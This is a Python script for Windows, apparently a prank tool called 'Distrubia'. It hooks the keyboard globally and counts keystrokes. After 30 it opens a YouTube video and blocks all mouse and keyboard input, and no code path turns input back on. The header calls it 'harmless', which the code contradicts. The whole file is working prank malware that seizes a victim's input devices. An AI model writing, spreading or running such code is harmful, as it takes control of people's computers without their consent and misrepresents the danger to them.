                                  
#  _____     _   _                   
# |  _  |_ _| |_| |_ ___ ___ ___ ___ 
# |   __| | |  _|   | . | . | -_|   |
# |__|  |_  |_| |_|_|___|_  |___|_|_|
#       |___|           |___|        

# Distrubia
# By Pythogen

# This program waits for keyboard input,
# After 30 keystrokes are detected...
# A video (configurable) appears in your web browser and...
# Your keyboard/mouse are disabled forcing you to view the video.

# This script is harmless


# Load modules
from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import sys
import webbrowser
from time import sleep

# Access DLLs
user32 = windll.user32
kernel32 = windll.kernel32
winTitle = None

# Globals
a = 0
# Video URL (Full Screen/Autoplay)
url = 'http://www.youtube.com/embed/quyXS4a0JGQ?rel=0&autoplay=1'

# Main Routine
def Main():
	# Create hook
	kl = pyHook.HookManager()
	kl.KeyDown = KeyIN
	# Register hook and register
	kl.HookKeyboard()
	pythoncom.PumpMessages()

# Disable Keyboard
def disaB(event):
	return False

# Enable Keyboard
def enaB(event):
	return True

# Key input function
def KeyIN(event):
	global a

	# How many keystrokes
	a = a + 1
	print a

	# After this many keystrokes..
	if a == 30:
		webbrowser.open_new(url)

		# Configure to Disable Mouse/Keyboard
		hm = pyHook.HookManager()
		hm.MouseAll = disaB
		hm.KeyAll = disaB
		hm.HookMouse()
		hm.HookKeyboard()
		pythoncom.PumpMessages()
		
		# Call to Disable
		disaB

	# Return to hook
	return True

# Call Main routine.
Main()